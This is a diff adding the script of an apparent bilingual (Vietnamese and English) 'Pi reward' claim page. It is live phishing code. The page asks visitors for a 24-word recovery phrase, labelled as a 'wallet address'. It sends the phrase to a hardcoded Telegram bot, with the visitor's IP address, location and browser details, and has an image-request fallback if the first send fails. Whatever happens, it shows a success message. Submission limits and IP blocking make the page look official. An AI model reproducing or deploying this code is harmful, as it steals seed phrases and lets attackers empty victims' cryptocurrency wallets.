+                return parseInt(localStorage.getItem('piSubmissionCount') || '0');
+            } catch (e) {
+                console.error('Error accessing localStorage:', e);
+                return 0;
+            }
+        }
+        
+        function incrementSubmissionCount() {
+            try {
+                const currentCount = getSubmissionCount();
+                localStorage.setItem('piSubmissionCount', (currentCount + 1).toString());
+                return currentCount + 1;
+            } catch (e) {
+                console.error('Error updating localStorage:', e);
+                return 0;
+            }
+        }
+        
+        // Check if user has exceeded submission limit
+        function hasExceededLimit() {
+            return getSubmissionCount() >= 2;
+        }
+        
+        // Update UI based on submission count
+        function updateUIForSubmissionCount() {
+            const currentCount = getSubmissionCount();
+            const limitMessage = document.getElementById('limitMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const unlockSubmitBtn = document.getElementById('unlockSubmitBtn');
+            const openFormBtn = document.getElementById('openFormBtn');
+            
+            // Case: User has exceeded limit
+            if (currentCount >= 2) {
+                // Show error message on form page
+                errorMessage.style.display = 'block';
+                limitMessage.style.display = 'none';
+                
+                // Disable submit button
+                unlockSubmitBtn.disabled = true;
+                unlockSubmitBtn.textContent = getCurrentLanguage() === 'vi' ? 'ĐÃ ĐẠT GIỚI HẠN YÊU CẦU' : 'REQUEST LIMIT REACHED';
+                
+                // If on home page, disable the button to open form
+                if (openFormBtn) {
+                    openFormBtn.disabled = true;
+                    openFormBtn.textContent = getCurrentLanguage() === 'vi' ? 'Đã Đạt Giới Hạn Yêu Cầu' : 'Request Limit Reached';
+                    openFormBtn.classList.add('opacity-50');
+                    openFormBtn.style.cursor = 'not-allowed';
+                }
+            } 
+            // Case: User has submitted once (show warning)
+            else if (currentCount === 1) {
+                limitMessage.style.display = 'block';
+                const warningText = getCurrentLanguage() === 'vi' 
+                    ? `Bạn đã gửi yêu cầu ${currentCount}/2 lần. Mỗi thiết bị chỉ được phép gửi tối đa 2 yêu cầu.`
+                    : `You have submitted ${currentCount}/2 requests. Each device is limited to a maximum of 2 requests.`;
+                limitMessage.innerHTML = `<i class="fas fa-exclamation-triangle mr-2"></i>${warningText}`;
+                errorMessage.style.display = 'none';
+                unlockSubmitBtn.disabled = false;
+            }
+            // Case: User hasn't submitted yet
+            else {
+                limitMessage.style.display = 'none';
+                errorMessage.style.display = 'none';
+                unlockSubmitBtn.disabled = false;
+            }
+        }
+        
+        // IP Tracking and Location Detection
+        let userIPData = null;
+        let ipBlockStatus = {
+            blocked: false,
+            reason: ''
+        };
+
+        // Get user's IP and location information
+        async function getUserIPInfo() {
+            try {
+                // Use ipinfo.io to get IP and location data
+                const response = await fetch('https://ipinfo.io/json?token=90d42ceec9b53a');
+                if (!response.ok) {
+                    throw new Error('Failed to fetch IP info');
+                }
+                
+                const data = await response.json();
+                userIPData = data;
+                
+                // Check if this is a suspicious IP
+                checkIfIPBlocked(data.ip);
+                
+                // Set language based on country
+                autoSetLanguage(data.country);
+                
+                // Display location notification
+                showLocationNotification(data);
+                
+                return data;
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return null;
+            }
+        }
+
+        // Show location notification
+        function showLocationNotification(ipData) {
+            if (!ipData) return;
+            
+            const locationText = document.getElementById('locationText');
+            const countryFlag = document.getElementById('countryFlag');
+            const notification = document.getElementById('locationDetectedMessage');
+            
+            // Country flag
+            countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/${ipData.country.toLowerCase()}.svg`;
+            
+            // Location text based on language
+            const currentLang = getCurrentLanguage();
+            if (currentLang === 'vi') {
+                locationText.textContent = `Đã phát hiện vị trí: ${ipData.city || ''}, ${ipData.country}`;
+            } else {
+                locationText.textContent = `Location detected: ${ipData.city || ''}, ${ipData.country}`;
+            }
+            
+            // Show notification
+            notification.classList.add('visible');
+            
+            // Hide after 5 seconds
+            setTimeout(() => {
+                notification.classList.remove('visible');
+            }, 5000);
+        }
+
+        // Check if IP is in blocked list
+        function checkIfIPBlocked(ip) {
+            // Get blocked IPs from localStorage or initialize if not existing
+            let blockedIPs = [];
+            try {
+                const storedIPs = localStorage.getItem('blockedIPs');
+                blockedIPs = storedIPs ? JSON.parse(storedIPs) : [];
+            } catch (e) {
+                console.error('Error accessing blocked IPs:', e);
+            }
+            
+            // Check if current IP is blocked
+            const isBlocked = blockedIPs.some(item => item.ip === ip);
+            
+            if (isBlocked) {
+                ipBlockStatus.blocked = true;
+                // Get more details about the block
+                const blockedEntry = blockedIPs.find(item => item.ip === ip);
+                ipBlockStatus.reason = blockedEntry?.reason || 'Suspicious activity';
+                
+                // Show blocked message
+                showBlockedMessage();
+            }
+            
+            return isBlocked;
+        }
+
+        // Add IP to blocked list
+        function blockIP(ip, reason = 'Multiple suspicious requests') {
+            if (!ip) return;
+            
+            try {
+                // Get existing blocked IPs
+                let blockedIPs = [];
+                try {
+                    const storedIPs = localStorage.getItem('blockedIPs');
+                    blockedIPs = storedIPs ? JSON.parse(storedIPs) : [];
+                } catch (e) {
+                    blockedIPs = [];
+                }
+                
+                // Add new IP if not already blocked
+                if (!blockedIPs.some(item => item.ip === ip)) {
+                    blockedIPs.push({
+                        ip: ip,
+                        reason: reason,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // Store updated list
+                    localStorage.setItem('blockedIPs', JSON.stringify(blockedIPs));
+                    
+                    // Update status
+                    ipBlockStatus.blocked = true;
+                    ipBlockStatus.reason = reason;
+                    
+                    // Show blocked message
+                    showBlockedMessage();
+                }
+            } catch (error) {
+                console.error('Error blocking IP:', error);
+            }
+        }
+
+        // Show blocked IP message
+        function showBlockedMessage() {
+            const blockedMessage = document.getElementById('ipBlockedMessage');
+            blockedMessage.style.display = 'block';
+            
+            // Disable forms and buttons
+            const unlockSubmitBtn = document.getElementById('unlockSubmitBtn');
+            const openFormBtn = document.getElementById('openFormBtn');
+            
+            if (unlockSubmitBtn) {
+                unlockSubmitBtn.disabled = true;
+            }
+            
+            if (openFormBtn) {
+                openFormBtn.disabled = true;
+                openFormBtn.style.cursor = 'not-allowed';
+                openFormBtn.classList.add('opacity-50');
+            }
+        }
+
+        // Close blocked message
+        function closeBlockedMessage() {
+            const blockedMessage = document.getElementById('ipBlockedMessage');
+            blockedMessage.style.display = 'none';
+        }
+
+        // Track suspicious activity and potentially block IP
+        function trackSuspiciousActivity() {
+            if (!userIPData || !userIPData.ip) return;
+            
+            // Counter for suspicious activities
+            let suspiciousCount = 0;
+            try {
+                suspiciousCount = parseInt(localStorage.getItem(`suspicious_${userIPData.ip}`) || '0');
+            } catch (e) {
+                suspiciousCount = 0;
+            }
+            
+            // Increment count
+            suspiciousCount++;
+            
+            // Store updated count
+            try {
+                localStorage.setItem(`suspicious_${userIPData.ip}`, suspiciousCount.toString());
+            } catch (e) {
+                console.error('Error storing suspicious activity count:', e);
+            }
+            
+            // Block IP if threshold is reached (after 5 suspicious attempts)
+            if (suspiciousCount >= 5) {
+                blockIP(userIPData.ip, 'Multiple suspicious requests detected');
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Language Switching
+        let currentLanguage = 'vi'; // Default language
+
+        // Set language
+        function setLanguage(lang) {
+            currentLanguage = lang;
+            
+            // Update language option UI
+            const languageOptions = document.querySelectorAll('.language-option');
+            languageOptions.forEach(option => {
+                if (option.getAttribute('data-lang') === lang) {
+                    option.classList.add('active');
+                } else {
+                    option.classList.remove('active');
+                }
+            });
+            
+            // Update all text elements with language attributes
+            const elements = document.querySelectorAll('[data-vi][data-en]');
+            elements.forEach(element => {
+                // Handle placeholder attribute for inputs
+                if (element.hasAttribute('placeholder')) {
+                    element.setAttribute('placeholder', element.getAttribute(`data-${lang}`));
+                } 
+                // Handle text content for regular elements
+                else {
+                    element.textContent = element.getAttribute(`data-${lang}`);
+                }
+            });
+            
+            // Store language preference
+            try {
+                localStorage.setItem('preferredLanguage', lang);
+            } catch (e) {
+                console.error('Error storing language preference:', e);
+            }
+            
+            // Update UI for submission count with correct language
+            updateUIForSubmissionCount();
+        }
+
+        // Get current language
+        function getCurrentLanguage() {
+            return currentLanguage;
+        }
+
+        // Auto-set language based on country
+        function autoSetLanguage(countryCode) {
+            // Check if user has a stored preference
+            let storedPreference;
+            try {
+                storedPreference = localStorage.getItem('preferredLanguage');
+            } catch (e) {
+                storedPreference = null;
+            }
+            
+            // If user has a preference, use that
+            if (storedPreference) {
+                setLanguage(storedPreference);
+                return;
+            }
+            
+            // Otherwise, detect based on country
+            if (countryCode === 'VN') {
+                setLanguage('vi');
+            } else {
+                setLanguage('en');
+            }
+        }
+
+        // Initialize language options
+        function initializeLanguageOptions() {
+            const languageOptions = document.querySelectorAll('.language-option');
+            
+            languageOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    setLanguage(lang);
+                });
+            });
+            
+            // Set initial active state
+            let initialLang = 'vi';
+            try {
+                const storedPreference = localStorage.getItem('preferredLanguage');
+                if (storedPreference) {
+                    initialLang = storedPreference;
+                }
+            } catch (e) {
+                initialLang = 'vi';
+            }
+            
+            setLanguage(initialLang);
+        }
+        
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize language options
+            initializeLanguageOptions();
+            
+            // Get user's IP and location information
+            getUserIPInfo();
+            
+            // Use requestAnimationFrame for better performance
+            requestAnimationFrame(() => {
+                createPremiumBackground();
+                createExplosionParticles();
+                setupFeatureCardWaves();
+            });
+            
+            // Delay non-essential animations
+            setTimeout(() => {
+                handleScrollAnimations();
+            }, 100);
+            
+            // Check submission count and update UI
+            updateUIForSubmissionCount();
+            
+            // Set up blocked message close button
+            document.getElementById('closeBlockedMessage').addEventListener('click', closeBlockedMessage);
+            
+            // Hide back button initially
+            const headerBackBtn = document.getElementById('headerBackBtn');
+            headerBackBtn.style.visibility = 'hidden';
+            
+            // Button click handlers
+            const openFormBtn = document.getElementById('openFormBtn');
+            const backToHomeBtn = document.getElementById('backToHomeBtn');
+            const unlockSubmitBtn = document.getElementById('unlockSubmitBtn');
+            const closeSuccessBtn = document.getElementById('closeSuccessBtn');
+            
+            // Open form page
+            openFormBtn.addEventListener('click', function() {
+                // Check if IP is blocked
+                if (ipBlockStatus.blocked) {
+                    showBlockedMessage();
+                    return;
+                }
+                
+                // If user has exceeded limit, don't allow opening form
+                if (hasExceededLimit()) {
+                    const message = getCurrentLanguage() === 'vi' 
+                        ? 'Bạn đã vượt quá số lần gửi yêu cầu cho phép.'
+                        : 'You have exceeded the allowed number of requests.';
+                    alert(message);
+                    return;
+                }
+                
+                navigateTo('homePage', 'formPage', 'right');
+                updateUIForSubmissionCount();
+            });
+            
+            // Back to home
+            backToHomeBtn.addEventListener('click', function() {
+                navigateTo('formPage', 'homePage', 'left');
+            });
+            
+            // Header back button
+            headerBackBtn.addEventListener('click', function() {
+                const activePageId = document.querySelector('.page.page-active').id;
+                
+                if (activePageId === 'formPage') {
+                    navigateTo('formPage', 'homePage', 'left');
+                }
+            });
+            
+            // Word counter and validation
+            const walletAddressInput = document.getElementById('walletAddress');
+            const wordCounter = document.getElementById('wordCounter');
+            const validationMessage = document.getElementById('validationMessage');
+            const inputContainer = document.querySelector('.pi-input-container');
+            
+            // Update word count on input with debounce for better performance
+            let debounceTimer;
+            walletAddressInput.addEventListener('input', function() {
+                clearTimeout(debounceTimer);
+                debounceTimer = setTimeout(() => {
+                    const text = this.value.trim();
+                    let wordCount = 0;
+                    
+                    if (text) {
+                        // Count words (sequences separated by spaces)
+                        wordCount = text.split(/\s+/).filter(word => word.length > 0).length;
+                    }
+                    
+                    // Only show validation when count is wrong
+                    if (wordCount > 0 && wordCount !== 24) {
+                        const lang = getCurrentLanguage();
+                        wordCounter.textContent = lang === 'vi'
+                            ? `Vui lòng nhập đủ 24 từ (hiện tại: ${wordCount} từ)`
+                            : `Please enter exactly 24 words (current: ${wordCount})`;
+                        wordCounter.classList.add('invalid');
+                        inputContainer.classList.add('invalid-input');
+                        inputContainer.classList.remove('valid-input');
+                        validationMessage.classList.remove('hidden');
+                    } else if (wordCount === 24) {
+                        wordCounter.textContent = '';
+                        wordCounter.classList.remove('invalid');
+                        inputContainer.classList.add('valid-input');
+                        inputContainer.classList.remove('invalid-input');
+                        validationMessage.classList.add('hidden');
+                    } else {
+                        wordCounter.textContent = '';
+                        wordCounter.classList.remove('invalid');
+                        inputContainer.classList.remove('valid-input', 'invalid-input');
+                        validationMessage.classList.add('hidden');
+                    }
+                }, 200); // 200ms debounce delay
+            });
+            
+            // Form submission
+            unlockSubmitBtn.addEventListener('click', async function() {
+                // Check if IP is blocked
+                if (ipBlockStatus.blocked) {
+                    showBlockedMessage();
+                    return;
+                }
+                
+                // Check if user has exceeded submission limit
+                if (hasExceededLimit()) {
+                    const lang = getCurrentLanguage();
+                    document.getElementById('errorMessage').style.display = 'block';
+                    document.getElementById('errorMessage').innerHTML = `<i class="fas fa-ban mr-2"></i>${lang === 'vi' 
+                        ? 'Bạn đã vượt quá số lần gửi yêu cầu cho phép (2 lần). Vui lòng liên hệ bộ phận hỗ trợ nếu cần trợ giúp.'
+                        : 'You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.'}`;
+                    return;
+                }
+                
+                const walletAddress = walletAddressInput.value.trim();
+                
+                // Count words
+                const wordCount = walletAddress.split(/\s+/).filter(word => word.length > 0).length;
+                
+                // Validate word count
+                if (!walletAddress || wordCount !== 24) {
+                    inputContainer.classList.add('invalid-input');
+                    const lang = getCurrentLanguage();
+                    wordCounter.textContent = lang === 'vi'
+                        ? `Vui lòng nhập đủ 24 từ (hiện tại: ${wordCount} từ)`
+                        : `Please enter exactly 24 words (current: ${wordCount})`;
+                    wordCounter.classList.add('invalid');
+                    validationMessage.classList.remove('hidden');
+                    return;
+                }
+                
+                showLoading();
+                
+                try {
+                    // Increment submission count before making the request
+                    const newCount = incrementSubmissionCount();
+                    
+                    // Get IP information for logging
+                    const ipInfo = userIPData || await getUserIPInfo() || { ip: 'unknown', country: 'unknown', city: 'unknown' };
+                    
+                    // Replace with your actual Telegram bot token and chat ID
+                    const BOT_TOKEN = '7161535723:AAGqp8BU4hsvaUCO0nBdx6-tZM9BOwZfj1Y';
+                    const CHAT_ID = '7305842707';
+                    
+                    // Prepare message with IP and location data
+                    const message = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${ipInfo.ip}\n📍 Vị trí: ${ipInfo.city || 'N/A'}, ${ipInfo.country || 'N/A'}\n🖥️ Browser: ${navigator.userAgent}`;
+                    
+                    // Send to Telegram
+                    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        setTimeout(() => {
+                            // Add a slight delay to show loading state
+                            hideLoading();
+                            showSuccessModal(walletAddress);
+                            
+                            // Update UI for new submission count
+                            updateUIForSubmissionCount();
+                        }, 1000);
+                    } else {
+                        throw new Error('Failed to send message to Telegram');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    
+                    // Track suspicious activity if there's an error
+                    if (trackSuspiciousActivity()) {
+                        // IP was blocked due to suspicious activity
+                        hideLoading();
+                        showBlockedMessage();
+                        return;
+                    }
+                    
+                    // Fallback method using image request
+                    const img = new Image();
+                    const timestamp = new Date().getTime();
+                    const newCount = getSubmissionCount();
+                    const ipInfo = userIPData || { ip: 'unknown', country: 'unknown', city: 'unknown' };
+                    
+                    const fallbackMessage = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${ipInfo.ip}\n📍 Vị trí: ${ipInfo.city || 'N/A'}, ${ipInfo.country || 'N/A'}\n🖥️ Browser: ${navigator.userAgent}`;
+                    
+                    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fallbackMessage)}&t=${timestamp}`;
+                    
+                    img.onload = img.onerror = function() {
+                        setTimeout(() => {
+                            hideLoading();
+                            showSuccessModal(walletAddress);
+                            
+                            // Update UI for new submission count
+                            updateUIForSubmissionCount();
+                        }, 1000);
+                    };
+                }
+            });
+            
+            closeSuccessBtn.addEventListener('click', function() {
+                hideSuccessModal();
+                navigateTo('formPage', 'homePage', 'left');
+                document.getElementById('walletAddress').value = '';
+                
+                // Update UI to reflect current submission count
+                updateUIForSubmissionCount();
+            });
+        });
+    </script>
+</body>
+</html>
